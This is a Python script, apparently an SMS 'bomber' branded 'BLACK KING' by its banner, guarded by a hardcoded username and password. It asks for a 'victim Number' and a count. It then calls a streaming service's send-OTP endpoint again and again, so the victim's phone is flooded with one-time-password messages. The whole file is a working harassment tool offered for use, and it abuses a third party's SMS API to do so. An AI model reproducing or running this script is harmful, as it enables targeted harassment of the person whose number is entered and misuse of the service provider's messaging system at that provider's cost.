import sys
import requests
import time
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White
# Bold
bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
bgreen="\033[1;32m"       # Green
byellow="\033[1;33m"      # Yellow
bblue="\033[1;34m"        # Blue
bpurple="\033[1;35m"      # Purple
bcyan="\033[1;36m"        # Cyan
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
color_off="\033[0m"       # Text Reset
logo=(bblue+''''oooooooooo.  ooooo              .o.         .oooooo.   oooo    oooo      oooo    oooo ooooo ooooo      ooo   .oooooo.    
`888'   `Y8b `888'             .888.       d8P'  `Y8b  `888   .8P'       `888   .8P'  `888' `888b.     `8'  d8P'  `Y8b   
 888     888  888             .8"888.     888           888  d8'          888  d8'     888   8 `88b.    8  888           
 888oooo888'  888            .8' `888.    888           88888[            88888[       888   8   `88b.  8  888           
 888    `88b  888           .88ooo8888.   888           888`88b.          888`88b.     888   8     `88b.8  888     ooooo 
 888    .88P  888       o  .8'     `888.  `88b    ooo   888  `88b.        888  `88b.   888   8       `888  `88.    .88'  
o888bood8P'  o888ooooood8 o88o     o8888o  `Y8bood8P'  o888o  o888o      o888o  o888o o888o o8o        `8   `Y8bood8P'   
                                                                                                                         
                                                                                                                         
                                                                                                                         ''')
print(logo)

line=byellow+"<=====================================================================================>"
print(line)

usern="black"    #Tools username & password
passwd="king"

inpuser=str(input("Enter Tools user name: "))
inppass=str(input(" Enter Tools password: "))

if usern==inpuser and passwd==inppass:
	print(bgreen+"[√]Username & Password was correct"+color_off)
	pass
else:
	print(red+"[×]Wrong Username & password"+color_off)
	sys.exit()	

#Victim's phone number and bombing amount
number=str(input(bpurple+" Enter victim Number: "))
amount=int(input(bcyan+"Enter The Amount: ")) 

#Bioscope Live TV API
api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for i in range(amount):
	requests.get(api)	
	
	time.sleep(30)	#Delivery Time
	print(green+str(i+1)+"[√] Message Sent Successfully"+color_off)